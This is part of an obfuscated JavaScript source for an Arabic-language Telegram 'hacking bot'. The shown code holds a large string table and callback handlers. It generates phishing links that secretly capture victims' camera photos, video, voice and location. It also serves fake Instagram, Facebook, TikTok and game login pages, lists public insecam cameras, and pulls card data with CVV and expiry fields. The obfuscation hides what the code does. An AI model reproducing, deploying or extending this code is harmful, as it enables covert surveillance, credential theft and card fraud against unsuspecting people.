        'تصفير\x20الذا',
        'memory',
        'Error\x20send',
        'هونغ\x20كونغ\x20',
        'بيلاروس\x20🇧🇾',
        'رى\x20لاحقًا.',
        'الصين\x20🇨🇳',
        'سلوفاكيا\x20🇸🇰',
        'شرح\x20البوت\x20',
        'خول\x20لرابط\x20',
        'TPkgq',
        'تم\x20اختراق\x20',
        'board',
        'kAsfy',
        'بيرو\x20🇵🇪',
        'الأرجنتين\x20',
        'NYEHS',
        'SEtdM',
        '\x20🌐\x0a-\x20إصدار',
        'VLXVk',
        'بورتوريكو\x20',
        '<strong>جا',
        '\x20🗑</strong',
        'SThml',
        'fEItV',
        'mmnyQ',
        '/de\x0a\x0a<stro',
        '5fuIflX',
        'اشترك\x20في\x20',
        'h.me/',
        'اليونان\x20🇬🇷',
        'tvWrj',
        'YJCvF',
        'phone_numb',
        'vice_info',
        'colorDepth',
        'qvNqu',
        'uery',
        'ا\x20الامر\x20/V',
        'onText',
        'ook',
        'DJSrr',
        'type',
        'YJIcKlujfP',
        'سحب\x20جميع\x20ص',
        'Stored\x20and',
        'push',
        'إنشاء\x20إيمي',
        'ًا\x20',
        'SZvNT',
        'تم\x20تصوير\x20ا',
        'البوسنة\x20وا',
        'xkoaC',
        '/xx',
        'response',
        'for\x20chatId',
        'voice',
        'اختراق\x20انس',
        'ook:',
        '\x20⏰\x0a-\x20اسم\x20ا',
        '\x20الضحيه\x20بد',
        'KAnuV',
        'YKfkn',
        'مله\x20ارسلها',
        'vJauY',
        'ارساله\x20لضح',
        'ظه\x20بزم\x20يكو',
        '\x20حذف\x20حسابك',
        'الدردشة\x20مع',
        'https://fl',
        'إختراق\x20فري',
        'ode>',
        'ية\x20📷',
        'KGTLS',
        '\x20نقاط.',
        'essing\x20vid',
        'ال\x20للتحقق.',
        'UnnvO',
        'tiktok',
        '@oapajh',
        'iOebq',
        'اله\x20طويله\x20',
        '<strong>ال',
        'yvYLP',
        '\x20المحتله\x20🇮🇱',
        'filter',
        '\x20في\x20جهاز\x20ا',
        'قائي\x20',
        '<strong>❗ل',
        'تم\x20تلغيم\x20ه',
        'غانا\x20🇬🇭',
        'uuid',
        'ميع\x20قنوات\x20',
        '2BT3BlbkFJ',
        'م\x20هذا\x20هو\x0a:',
        'essage',
        '\x20أسماء\x20الم',
        'ntation',
        'VETkM',
        'ovPcA',
        'كندا\x20🇨🇦',
        'muLiL',
        '\x20⚠️',
        'تم\x20إرسال\x20م',
        'نة:\x20',
        'لرجاء\x20المح',
        '/whatsapp',
        '\x20إيميل\x20وهم',
        '\x20📊\x0a-\x20دقة\x20ا',
        'لرابط\x20ملاح',
        'xvorv',
        'tPEPj',
        'التشيك\x20🇨🇿',
        'rning-anim',
        'صربيا\x20🇷🇸',
        'attempts',
        'BKJYz',
        '\x20على\x20معلوم',
        '/mm',
        'SHxQh',
        'لوحة\x20التحك',
        'ع\x20اضافة\x20فا',
        'node-teleg',
        'callback_q',
        'جلد:\x20',
        'biMif',
        'CpKER',
        'ال\x20معرف\x20ال',
        'HTZtu',
        'xrNcn',
        'wdUEY',
        'gram',
        'زامبيا\x20🇿🇲',
        'HJbzA',
        '\x20sent\x20vide',
        'OuolG',
        'شتراك\x20في\x20ج',
        'wQAzt',
        'ضحيه\x20في\x20اد',
        'ستقبال\x20الا',
        'PScdC',
        'hveXc',
        'ngan.glitc',
        'في\x20الطلب.',
        'WeZBj',
        '\x0a📱\x20**معلوم',
        'Error\x20chec',
        'networkSpe',
        'ي\x20تلغيم\x20را',
        '\x20لتقنية\x20ال',
        '$\x0aعندما\x20تو',
        'choices',
        'اختراق\x20الك',
        'floor',
        '67383pcnXNx',
        'NGtcv',
        '\x20المستخدم:',
        'fTkkJ',
        'hyGny',
        'os\x20for\x20cha',
        'قر\x20على\x20الر',
        'RxpJn',
        '@hsosgh',
        '&type=tikt',
        '.insecam.o',
        '/record/',
        'HeQuS',
        '.io/api/v3',
        'QCosd',
        'join',
        '4.com',
        'xCuBv',
        'لبنان\x20🇱🇧',
        'ن\x20النت\x20قوي',
        'كوريا\x20الجن',
        'ابه\x20تلجرام',
        'kEUII',
        'السلفادور\x20',
        'تة.',
        'tId\x20',
        ':</strong>',
        'd\x20Bank',
        'لا\x20يوجد\x20اس',
        'المغرب\x20🇲🇦',
        'جداً\x20لا\x20تق',
        'ل\x20وهمي',
        'imageDatas',
        '/so',
        'link',
        'قطر\x20🇶🇦',
        '▓▓▓▓░░░░░░',
        'وله\x20بسبب\x20ق',
        'get_freefi',
        'اتف\x20كاملاً',
        'otocol',
        'getItem',
        '\x20اخره\x20لاحق',
        '/xx.html?c',
        'fuschia-lo',
        'min',
        'https',
        'chatId',
        'array',
        '1kNNPU6RVm',
        'GgPOV',
        'Bank\x20of\x20Am',
        'nSpxU',
        'base64',
        'r.html',
        'aUKfx',
        'باراغواي\x20🇵🇾',
        'الرجاء\x20توف',
        'راق',
        'rshq_faceb',
        'deviceName',
        'قيرغيزستان',
        'readdirSyn',
        'PORT',
        'السعودية\x20🇸🇦',
        't.html',
        'quest:\x20Mis',
        'إيقاف\x20البر',
        'https://fo',
        '\x0a<strong>ي',
        'urlencoded',
        'ختلفه\x20او\x20ح',
        '/email/new',
        'YAxlf',
        'deleteMess',
        'orage',
        'جهازك\x20او\x20ط',
        '.jpg',
        'DUknP',
        'ugKWM',
        '\x20NT\x2010.0;\x20',
        'memoryStor',
        'ناميبيا\x20🇳🇦',
        'س\x20لديك\x20إيم',
        'يتك\x20في\x20الد',
        '/completio',
        'lzntX',
        'country',
        '🇦🇫',
        'mm.html',
        'lastUpdate',
        'خل\x20إلى\x20الر',
        'يه\x20لمعرفة\x20',
        'next_',
        'اب\x20لفك\x20الح',
        'dotenv',
        '🇳🇨',
        'حقق\x20من\x20جهة',
        'ود\x20🇲🇪',
        'pUJlR',
        '\x20الرسالة.\x20',
        'Error\x20proc',
        'DRgEV',
        '/?page=',
        'member',
        'sooGC',
        'لم\x20تفتح\x20ال',
        'ل\x20وهمي\x20💌',
        'تايلاند\x20🇹🇭',
        'body-parse',
        'بولندا\x20🇵🇱',
        'ue\x20:*\x20`',
        'لقد\x20قام\x20ال',
        '\x20ما</stron',
        'CWufH',
        'تونس\x20🇹🇳',
        'king\x20subsc',
        'هاز\x20بنجاح',
        'ن\x20🇩🇴',
        'time',
        'MSQRk',
        'ton\x20below\x20',
        '.\x0a\x20⚠️ملاحظه',
        '\x20🔻\x0a-\x20المدي',
        'ير\x20chatId\x20',
        'لرابط:\x20',
        'Reinq',
        'ILoKB',
        'gUMRv',
        '🇳🇿',
        '/submitVoi',
        'PPFiZ',
        'قم\x20بإرسال\x20',
        'ابط\x20لإضافة',
        'لضحيه\x0a:\x20',
        'me/ZII0_bo',
        'Citibank',
        'get_pubg',
        'ixcuX',
        'xdPRy',
        'لنظام:\x20',
        'جزر\x20كايمان',
        'ck/:linkId',
        'مية\x20📸',
        'nFLVx',
        'قبة\x20📡',
        'ل\x20بعد\x20🗳ً</',
        'دما\x20يقوم\x20ش',
        '\x20:\x20',
        'ZDmEU',
        'ائل</stron',
        'ية\x20فيديو\x20🎥',
        'log',
        'LXXGK',
        'لام\x20معلوما',
        'يس\x20اسمي',
        'اليابان\x20🇯🇵',
        'FoYvk',
        '\x20من\x20VIP.',
        'إلغاء\x20اشتر',
        'جزر\x20فارو\x20🇫🇴',
        'body_text',
        'ل\x20مره\x20اخرى',
        '/strong><c',
        '\x20🏙️\x0a-\x20عنوان',
        'oVwqw',
        '`\x0a*[-]\x20Ban',
        '\x20توك\x20📳',
        'greencafe2',
        'b.html',
        '5051529VVZiAO',
        'WKKzL',
        'iry\x20:*\x20`',
        'بريطانيا\x20🇬🇧',
        'bpVgk',
        '`\x0a*[-]\x20Val',
        '\x20📶\x20(سرعة:\x20',
        'TD\x20Bank',
        'بوركينا\x20فا',
        'KYyFx',
        'PNC\x20Bank',
        'yJAfP',
        'anding-mas',
        'wYyjX',
        'ظر\x20عن\x20رقمي',
        'jzOla',
        'HfPzx',
        '\x2030$\x20يمكنك',
        'qxMAQ',
        'آيسلندا\x20🇮🇸',
        'erica',
        'ta\x20found\x20o',
        'تسجيل\x20صوت\x20',
        'to\x20generat',
        '&type=inst',
        'خرى\x20لاحقًا',
        'Chohn',
        'تم\x20انشاء\x20ر',
        'ZIHrl',
        'فرنسا\x20🇫🇷',
        'فشل\x20في\x20إرس',
        'inline_key',
        '\x20📡\x0a-\x20الوقت',
        'ucOZk',
        'ابط\x20قم\x20في\x20',
        'vBjeU',
        'سو\x20🇧ﺫ',
        '\x20complete',
        '/captureFr',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'mkdirSync',
        'bRtLf',
        '%\x20🔋\x0a-\x20هل\x20ا',
        'upport',
        '\x20النقاط\x20ال',
        'W5B7mU',
        '/ca',
        'إضافة\x20مشتر',
        'sPISG',
        'كواد\x20والرس',
        '\x20نظام\x20التش',
        '*الايدي\x20:\x20',
        'me/',
        'رواندا\x20🇷🇼',
        '🇮🇩',
        'الهند\x20🇮🇳',
        'ال\x20الخاصة\x20',
        'دم\x20VIP',
        'nAvailable',
        'remove_vip',
        'إغلاق\x20المو',
        'ل\x20على\x20المن',
        'تصال:\x20',
        'add_nammes',
        'static',
        'الخادم\x20يعم',
        'نيبال\x20🇳🇵',
        'nEiaI',
        'sendVoice',
        'wFDuQ',
        'multer',
        '\x20🌍\x0a-\x20شحن\x20ا',
        'sendMessag',
        'aThHadlLGB',
        'vipUsers',
        'SIyiL',
        'jsWPR',
        'ية\x20تحديد\x20ا',
        'ing\x20Telegr',
        'املاً\x20قم\x20ب',
        '==========',
        'OcepQ',
        'NdnnC',
        'ابدأ\x20الاخت',
        'Markdown',
        'ابط.',
        'نيوزيلندا\x20',
        'bcBsN',
        'hAFgU',
        'lmtvF',
        'hex',
        '\x20📏\x0a-\x20إصدار',
        'vFLMg',
        'vRrZB',
        'Processing',
        'م\x20استلمها\x20',
        '😁.',
        'ca.html',
        'عزيزي\x20حمود',
        'map',
        'ب\x20شات\x20⭐',
        'غيرنزي\x20🇬🇬',
        'e\x20Visa!*',
        'qvDvG',
        'qOjMB',
        'network',
        'use',
        'generate_i',
        'رة\x20(RAM):\x20',
        'تم\x20استخدام',
        'redirect',
        'https://cu',
        'recordVoic',
        'ق\x20الهاتف\x20ك',
        'qCERc',
        'ed.',
        'كوريا\x20الشم',
        'get_photo_',
        'applicatio',
        'مل\x20السابق\x20',
        'VISA\x20-\x20DEB',
        'browserNam',
        '?chatId=',
        'knszT',
        '\x20GB\x20💾\x0a-\x20عد',
        '.txt',
        '/submitNam',
        'OcVnO',
        'orSfY',
        'ت\x20الجهاز',
        'قد\x20حدث\x20خطأ',
        'get',
        'بنين\x20🇧🇯',
        'ApOHR',
        'بطًا\x20يبدأ\x20',
        'ztnIi',
        'Hgaoy',
        'الأردن\x20🇯🇴',
        'مرحبًا!\x20اض',
        'crypto',
        'سيتم\x20تصوير',
        'ر\x20رابط\x20🔒',
        'i.openai.c',
        '\x20انشـاء\x20بر',
        'ont/:linkI',
        'إيميل\x20الذي',
        'اول\x20مره\x20اخ',
        'امرا\x20الخلف',
        'NibGb',
        'request_ve',
        '\x20المميزات\x20',
        'نيكاراغوا\x20',
        '`\x0a*[-]\x20CVV',
        'includes',
        'fKmTu',
        'collect_de',
        'بوت\x20اختراق',
        'length',
        'instagram',
        'ت\x20الجهاز\x20🔬',
        'code',
        'TpeAd',
        'atId=',
        'Your-User-',
        '\x20نقاط',
        'MPjWv',
        'سايل\x20الضحي',
        'العراق\x20🇮🇶',
        'الدنمارك\x20🇩🇰',
        'ZneGB',
        'BsHif',
        'ذاكرة\x20المؤ',
        'د\x20لنسخه</s',
        'capture_vi',
        '7065665133',
        'QRLZq',
        'ible-pract',
        'لمستخدم\x20',
        'isa',
        'get_link',
        ']\x2025%',
        'نيجيريا\x20🇳🇬',
        'اب\x20أولاً</',
        'EJStK',
        'UYFvf',
        'trim',
        'fLMiq',
        'videos',
        '\x20🔒\x0a-\x20نطاق\x20',
        'message:',
        'body',
        'عدد\x20النقاط',
        'me/lTV_l/3',
        'ase\x20try\x20ag',
        'الصوره📸\x20',
        'Capital\x20On',
        'JOyqN',
        '🇱🇺',
        'الرجاء\x20إدخ',
        'sendPhoto',
        'لضحيه\x20فيدي',
        'رقم\x20الهاتف',
        'herVH',
        'ل\x20على\x201\x20نق',
        'dIGEOjpMgZ',
        'jSMOO',
        'seWwkhTzrZ',
        'لهجه\x20اليمن',
        'ساحل\x20العاج',
        'لا\x20بك\x20:\x20|\x20',
        'ss\x20the\x20but',
        '\x20⚡\x0a-\x20الشبك',
        'من\x20هذا\x20الد',
        'لخدمة.</st',
        'nFhbD',
        'uwPKR',
        'ener',
        'npQAb',
        '🇸🇻',
        'repeat',
        'مدفوع\x20بسعر',
        'رافي:\x20',
        'nt:',
        'الرجاء\x20الم',
        'أرسل\x20لي\x20را',
        'gram:',
        'am\x20message',
        'listen',
        'r\x20data\x20for',
        'hing\x20joke:',
        '📞\x20إرسال\x20جه',
        'aQyRP',
        'FZSss',
        'parse',
        'rm?chatId=',
        'once',
        'error',
        '\x20🇹🇲',
        'الرسالة\x20📩:',
        'touchSuppo',
        'CSeWg',
        'قه\x20عاليه:\x20',
        'الإمارات\x20🇦🇪',
        'bwHGp',
        'هاتف\x20هذا\x20ق',
        'user',
        'المشاهده\x20ع',
        '/ge',
        'المكسيك\x20🇲🇽',
        'ات\x20الجهاز:',
        'ginFK',
        '\x20أثناء\x20جلب',
        '\x20التي\x20قمت\x20',
        '\x20\x0aكلمة\x20الس',
        'Mpoix',
        'أستراليا\x20🇦🇺',
        'النمسا\x20🇦🇹',
        'startsWith',
        '\x20الرجاء\x20تغ',
        'ice.glitch',
        'كرة\x20المؤقت',
        'jkyWS',
        'uKpZr',
        'النرويج\x20🇳🇴',
        '&type=face',
        '\x20(KHTML,\x20l',
        '\x20🇰🇾',
        'yfeok',
        'getChatMem',
        'يح\x20يبدأ\x20بـ',
        'وة\x20امانها\x20',
        'F.html',
        'VUAfU',
        'geolocatio',
        '<strong>لي',
        '<strong>تم',
        'الجبل\x20الأس',
        'مكنك\x20إنشاء',
        'generate_v',
        'SIGINT',
        'files',
        '\x20الضحيه\x20عب',
        'BzDii',
        'أوغندا\x20🇺🇬',
        '\x20سابقاً\x20هو',
        'photos',
        'ف\x20\x20رساله\x20ج',
        'الضحية\x20🎤',
        'كول\x20الأمان',
        '150irIkGi',
        'إضافة\x20أسما',
        'toString',
        'لجهاز:\x20',
        'query',
        'ber',
        'editMessag',
        'YfDhU',
        '\x20هذا\x20الراب',
        'أوكرانيا\x20🇺🇦',
        'hFeDr',
        'uUyXw',
        'بك\x20فقط.',
        'send\x20video',
        'trong>',
        'بلجيكا\x20🇧🇪',
        'vJfID',
        'سريلانكا\x20🇱🇰',
        '`\x0a*[-]\x20Cou',
        'ير\x20هذا\x20الر',
        'screenOrie',
        'بلغاريا\x20🇧🇬',
        'hw.vercel.',
        '**\x0a-\x20الدول',
        'celRM',
        'مصر\x20🇪🇬',
        'existsSync',
        '\x20📅\x0a-\x20بروتو',
        'captureBac',
        'Clearing\x20c',
        'تركيا\x20🇹🇷',
        '\x20data.\x20Ple',
        'facebook',
        'bio',
        'cLUzw',
        '.mp4',
        'ًا.',
        'config',
        '\x20قم\x20في\x20تعي',
        'strong>',
        'QAALQ',
        'ata:',
        'dUDhi',
        'cIXGh',
        'getLocatio',
        'EDEXL',
        'https://ap',
        'لهرسك\x20🇧🇦',
        '\x20🔵\x0a-\x20دعم\x20ا',
        'FvecC',
        'GjvmG',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'راقبه',
        ']\x20100%',
        'sing\x20chatI',
        'ntry\x20:*\x20`',
        'سويسرا\x20🇨🇭',
        'axMiu',
        'ألبانيا\x20🇦🇱',
        '\x20المتصفح:\x20',
        'send',
        'ng>يرجى\x20ات',
        '\x20جهة\x20الاتص',
        'ء\x20جلب\x20الرس',
        'لم\x20يتم\x20اخت',
        'ناء\x20حذف\x20ال',
        'قاط\x20الصور.',
        '\x20الحساب:*\x0a',
        'rufES',
        'uFOTf',
        '\x20المطور\x20',
        'USA🇺🇸',
        'MhiMU',
        'sYlVG',
        'browserVer',
        'عبر\x20رابط\x20🔒',
        'QohxI',
        'uAlbs',
        'كوستاريكا\x20',
        'تصوير\x20الضح',
        'ال\x20للتحقق\x20',
        'uorescent-',
        'hatId=',
        'last_name',
        'Emtvn',
        '/submitCod',
        'لم\x20يتم\x20است',
        'ccurred:',
        'مل\x20وهمي\x20\x20/',
        'Kit/537.36',
        'بليز\x20🇧🇿',
        'videoData',
        'gQjQW',
        'احصل\x20على\x20ر',
        'rjQrn',
        'ال\x20الأسماء',
        '/k.html?ch',
        '\x20🧠\x0a-\x20الذاك',
        'userLink',
        'ابط\x20التقاط',
        'readFileSy',
        'الجزائر\x20🇩🇿',
        'فنلندا\x20🇫🇮',
        'rification',
        '\x20فاير',
        'الدومينيكا',
        'SunTrust\x20B',
        'البرتغال\x20🇵🇹',
        'Plsow',
        'longitude',
        'ion',
        'txUBW',
        'prev_',
        'all',
        'أرمينيا\x20🇦🇲',
        'uDFyt',
        'مك\x20المنحرف',
        '🤣🤣🤣🤣',
        'userId',
        'bXVxQ',
        'ة:\x20',
        'eKnyB',
        '\x20أثناء\x20إرس',
        'riXRc',
        'writeFileS',
        'rong>',
        'WpSPb',
        'Generating',
        'age',
        'trong>اضغط',
        '\x20🎨\x0a-\x20تاريخ',
        'القائمة:\x20',
        '\x20|\x20في\x20بـوت',
        'إيطاليا\x20🇮🇹',
        '</code>\x0a<s',
        'ygQqC',
        'ايل\x20الذي\x20ت',
        '/F.html?ch',
        'امر\x20التالي',
        '\x20على\x20البري',
        'asYCj',
        'لام\x20🧙‍♂️',
        'وقع\x20📍',
        'jlfwT',
        'RyWZe',
        '\x20بإنشاء\x20حس',
        'removeList',
        'ق\x20كامراة\x20م',
        'لاوس\x20🇱🇦',
        '@hqooosjjd',
        'https://fa',
        'ابط\x20أدناه\x20',
        '<strong>لم',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'MNEIp',
        'IT\x20-\x20VISA\x20',
        'KQxDs',
        'XGEJH',
        'fProY',
        'توغو\x20🇹🇬',
        'iver',
        'توباغو\x20🇹🇹',
        '\x20🇰🇬',
        'shhsssbot?',
        'WNNzZ',
        'xLmwQ',
        'd\x20or\x20video',
        'سلوفينيا\x20🇸🇮',
        'om/v1/chat',
        'GTjpW',
        'ل\x20كود\x20الرق',
        'لمراقبة\x20📡',
        'للحصول\x20على',
        'utf8',
        'بنجاح\x20✅',
        'ري\x20انشاء\x20ا',
        'قبرص\x20🇨🇾',
        'battery',
        'ة...',
        '\x20🔒',
        'yUxOT',
        '\x20روبوتًا.',
        'يرات\x20المرا',
        'اولة\x20مرة\x20أ',
        'keys',
        'عمان\x20🇴🇲',
        'Sent\x20photo',
        'pMwoy',
        'kVCku',
        'administra',
        '/getLocati',
        'لمتصفح:\x20',
        'من\x20أنك\x20لست',
        'qlvAf',
        'ه\x20وكلمات\x20ج',
        'ور\x20الهاتف\x20',
        'backQuery',
        'https://iw',
        'pMerV',
        '0\x20(Windows',
        '50mb',
        'الذي\x20تم\x20ان',
        'env',
        'غيل:\x20',
        '/capture',
        'لهاتف\x20يشحن',
        '.me/',
        'latitude',
        'تنزانيا\x20🇹🇿',
        'mat\x20is\x20not',
        'wcyds',
        'علومات\x20الج',
        'السويد\x20🇸🇪',
        'MBRcg'
    ];
    _0x20bb = function () {
        return _0x5951e1;
    };
    return _0x20bb();
}
bot[_0x1155f9(0x2bb)](/\/jjjjjavayy/, _0x104aa8 => {
    const _0x2561a0 = _0x1155f9, _0x565db7 = {
            'nauCe': _0x2561a0(0x12e) + _0x2561a0(0x334) + _0x2561a0(0x3b3) + _0x2561a0(0x2f4) + _0x2561a0(0x26b),
            'WNNzZ': _0x2561a0(0x1c4) + 'ي',
            'ZBaJN': _0x2561a0(0x3b7),
            'WpSPb': _0x2561a0(0x2da) + _0x2561a0(0x561),
            'yrqXX': _0x2561a0(0x354) + 're',
            'qvDvG': _0x2561a0(0x4fa) + 'ء',
            'qxMAQ': _0x2561a0(0x6de)
        }, _0x360525 = _0x104aa8[_0x2561a0(0x12c)]['id'], _0x4dc462 = _0x565db7[_0x2561a0(0xf1)];
    bot[_0x2561a0(0x420) + 'e'](_0x360525, _0x4dc462, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x565db7[_0x2561a0(0x59d)],
                        'callback_data': _0x565db7[_0x2561a0(0x116)]
                    }],
                [{
                        'text': _0x565db7[_0x2561a0(0x577)],
                        'callback_data': _0x565db7[_0x2561a0(0x65c)]
                    }],
                [{
                        'text': _0x565db7[_0x2561a0(0x43f)],
                        'callback_data': _0x565db7[_0x2561a0(0x3ea)]
                    }]
            ]
        }
    });
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), _0x2de40f => {
    const _0x3e1d03 = _0x1155f9, _0x4289ff = {
            'eKnyB': function (_0x4cf1d0, _0x4c60ed) {
                return _0x4cf1d0 === _0x4c60ed;
            },
            'aHzCs': _0x3e1d03(0x3b7),
            'wQAzt': function (_0x1090fc, _0x5e9df5) {
                return _0x1090fc === _0x5e9df5;
            },
            'bpVgk': _0x3e1d03(0x354) + 're',
            'XaAJP': _0x3e1d03(0x6de),
            'beGyN': _0x3e1d03(0x69c) + _0x3e1d03(0x28e) + '\x20✅',
            'WHkAj': _0x3e1d03(0x417)
        }, _0x47e0ff = _0x2de40f[_0x3e1d03(0x641)][_0x3e1d03(0x12c)]['id'];
    let _0x4ac258;
    if (_0x4289ff[_0x3e1d03(0x572)](_0x2de40f[_0x3e1d03(0x628)], _0x4289ff[_0x3e1d03(0x248)]))
        _0x4ac258 = baseUrl + (_0x3e1d03(0x678) + _0x3e1d03(0x47a)) + _0x47e0ff + _0x3e1d03(0x173);
    else {
        if (_0x4289ff[_0x3e1d03(0x31d)](_0x2de40f[_0x3e1d03(0x628)], _0x4289ff[_0x3e1d03(0x3dc)]))
            _0x4ac258 = baseUrl + (_0x3e1d03(0x582) + _0x3e1d03(0x47a)) + _0x47e0ff + _0x3e1d03(0x173);
        else
            _0x4289ff[_0x3e1d03(0x572)](_0x2de40f[_0x3e1d03(0x628)], _0x4289ff[_0x3e1d03(0x1e4)]) && (_0x4ac258 = baseUrl + (_0x3e1d03(0x6ba) + _0x3e1d03(0x47a)) + _0x47e0ff + _0x3e1d03(0x173));
    }
    if (_0x4ac258)
        bot[_0x3e1d03(0x420) + 'e'](_0x47e0ff, _0x3e1d03(0x247) + _0x3e1d03(0x699) + _0x4ac258), bot[_0x3e1d03(0x5fb) + _0x3e1d03(0x5bd)](_0x2de40f['id'], { 'text': _0x4289ff[_0x3e1d03(0x267)] });
    else
        _0x4289ff[_0x3e1d03(0x31d)](_0x2de40f[_0x3e1d03(0x628)], _0x4289ff[_0x3e1d03(0x169)]) && (bot[_0x3e1d03(0x420) + 'e'](_0x47e0ff, _0x3e1d03(0x3b2) + _0x3e1d03(0x5d4) + _0x3e1d03(0x63c) + _0x3e1d03(0x449) + _0x3e1d03(0x427) + _0x3e1d03(0x5ee) + _0x3e1d03(0x2ba) + 'ip'), bot[_0x3e1d03(0x5fb) + _0x3e1d03(0x5bd)](_0x2de40f['id'], { 'text': '' }));
}), bot[_0x1155f9(0x2bb)](/\/نننطسطوو/, _0x6d9e54 => {
    const _0x302f01 = _0x1155f9, _0x1f5386 = {
            'dDROP': _0x302f01(0x286) + _0x302f01(0x474) + _0x302f01(0x69b) + _0x302f01(0x5a4),
            'LZswm': _0x302f01(0x42b) + _0x302f01(0x368),
            'FZSss': _0x302f01(0x674) + 's',
            'ytUGJ': function (_0x261110, _0x32215e) {
                return _0x261110(_0x32215e);
            },
            'PwEyF': function (_0xb5672d, _0x3c9ec2) {
                return _0xb5672d(_0x3c9ec2);
            }
        }, _0x2d895e = _0x6d9e54[_0x302f01(0x12c)]['id'];
    bot[_0x302f01(0x420) + 'e'](_0x2d895e, _0x1f5386[_0x302f01(0x1b4)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x1f5386[_0x302f01(0x19e)],
                        'callback_data': _0x1f5386[_0x302f01(0x4c0)]
                    }]]
        }
    }), _0x1f5386[_0x302f01(0x1d3)](isDeveloper, _0x2d895e) && _0x1f5386[_0x302f01(0x145)](showAdminPanel, _0x2d895e);
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), async _0x1ac31a => {
    const _0x3ee118 = _0x1155f9, _0x1a8437 = {
            'ErXUc': function (_0x2a0c56, _0x4666d9) {
                return _0x2a0c56 === _0x4666d9;
            },
            'IqjLt': _0x3ee118(0x674) + 's',
            'HTZtu': function (_0x12ed27, _0x54f506) {
                return _0x12ed27(_0x54f506);
            },
            'SNfnS': function (_0x403653, _0x48e19e) {
                return _0x403653 in _0x48e19e;
            },
            'ryjQq': function (_0x328e5e, _0x4a96c8, _0x5b7738) {
                return _0x328e5e(_0x4a96c8, _0x5b7738);
            },
            'jlfwT': _0x3ee118(0x38b),
            'nFLVx': function (_0x30d877, _0x179d6a, _0x56750f) {
                return _0x30d877(_0x179d6a, _0x56750f);
            },
            'lzFun': _0x3ee118(0x569),
            'VUAfU': function (_0x17c3bb, _0x561a57) {
                return _0x17c3bb - _0x561a57;
            }
        }, _0x3ca912 = _0x1ac31a[_0x3ee118(0x641)][_0x3ee118(0x12c)]['id'];
    if (_0x1a8437[_0x3ee118(0xe7)](_0x1ac31a[_0x3ee118(0x628)], _0x1a8437[_0x3ee118(0x102)]))
        _0x1a8437[_0x3ee118(0x314)](showCountryList, _0x3ca912);
    else {
        if (_0x1a8437[_0x3ee118(0x63f)](_0x1ac31a[_0x3ee118(0x628)], countryTranslation))
            bot[_0x3ee118(0x378) + _0x3ee118(0x579)](_0x3ca912, _0x1ac31a[_0x3ee118(0x641)][_0x3ee118(0x10f)]), _0x1a8437[_0x3ee118(0x6ed)](displayCameras, _0x3ca912, _0x1ac31a[_0x3ee118(0x628)]);
        else {
            if (_0x1ac31a[_0x3ee118(0x628)][_0x3ee118(0x4d9)](_0x1a8437[_0x3ee118(0x588)])) {
                const _0x29f0fa = _0x1a8437[_0x3ee118(0x6ed)](parseInt, _0x1ac31a[_0x3ee118(0x628)][_0x3ee118(0xc1)]('_')[-0x1 * 0x1603 + 0x2 * 0x8e7 + -0x2 * -0x21b], -0x5 * -0x6ce + 0x151b + -0x3717);
                bot[_0x3ee118(0x378) + _0x3ee118(0x579)](_0x3ca912, _0x1ac31a[_0x3ee118(0x641)][_0x3ee118(0x10f)]), _0x1a8437[_0x3ee118(0x3be)](showCountryList, _0x3ca912, _0x29f0fa);
            } else {
                if (_0x1ac31a[_0x3ee118(0x628)][_0x3ee118(0x4d9)](_0x1a8437[_0x3ee118(0x17a)])) {
                    const _0x419e9f = _0x1a8437[_0x3ee118(0x6ed)](parseInt, _0x1ac31a[_0x3ee118(0x628)][_0x3ee118(0xc1)]('_')[0x1313 + -0x155d + 0x24b], 0x450 * -0x4 + -0xdb4 + 0x1efe), _0x4d8136 = Math[_0x3ee118(0x291)](0x2391 + 0x14e8 + -0x4f * 0xb7, _0x1a8437[_0x3ee118(0x4e8)](_0x419e9f, 0x80f * 0x1 + -0x248 + -0x5b5));
                    bot[_0x3ee118(0x378) + _0x3ee118(0x579)](_0x3ca912, _0x1ac31a[_0x3ee118(0x641)][_0x3ee118(0x10f)]), _0x1a8437[_0x3ee118(0x3be)](showCountryList, _0x3ca912, _0x4d8136);
                }
            }
        }
    }
});
const americanBanks = [
        _0x1155f9(0x361) + _0x1155f9(0x3ec),
        _0x1155f9(0x1f0),
        _0x1155f9(0x3b6),
        _0x1155f9(0x15c) + 'o',
        _0x1155f9(0x49b) + 'e',
        _0x1155f9(0x3e2),
        _0x1155f9(0xd3),
        _0x1155f9(0x3df),
        _0x1155f9(0x563) + _0x1155f9(0xef),
        _0x1155f9(0x1d0) + _0x1155f9(0x349)
    ], fetchVisaData = async () => {
        const _0x195378 = _0x1155f9, _0xf17b3 = {
                'YMmXn': function (_0xa68cc3, _0x25a050) {
                    return _0xa68cc3 === _0x25a050;
                },
                'eiefK': function (_0x56408c, _0x26599e) {
                    return _0x56408c * _0x26599e;
                },
                'nEiaI': _0x195378(0x450) + _0x195378(0x594) + _0x195378(0x154),
                'hAFgU': _0x195378(0x540),
                'aUKfx': function (_0xab372, _0x2a35b2) {
                    return _0xab372 + _0x2a35b2;
                },
                'vsoGk': _0x195378(0x5be) + _0x195378(0x50f) + _0x195378(0x65b),
                'bXVxQ': function (_0x227129, _0x4b2837) {
                    return _0x227129 > _0x4b2837;
                },
                'TpeAd': _0x195378(0x665) + _0x195378(0x3ed) + _0x195378(0x4bc) + _0x195378(0x5ca) + _0x195378(0x663) + _0x195378(0x44b),
                'xdPRy': _0x195378(0x259) + _0x195378(0x550)
            };
        try {
            const _0x33e7f2 = _0xf17b3[_0x195378(0x1cc)], _0x3afcc2 = await axios[_0x195378(0x45b)](_0x33e7f2), _0x20264d = _0x3afcc2[_0x195378(0x628)], _0x5437b8 = _0x20264d[_0x195378(0x491)]()[_0x195378(0xc1)]('\x0a');
            if (_0xf17b3[_0x195378(0x570)](_0x5437b8[_0x195378(0x475)], -0x1a9 * 0x11 + 0x240d * 0x1 + 0x3 * -0x29c)) {
                const _0x491ce4 = _0x5437b8[_0x195378(0x43b)](_0x27aa5c => {
                    const _0x5c38e1 = _0x195378, _0x583e84 = _0x27aa5c[_0x5c38e1(0xc1)]('|');
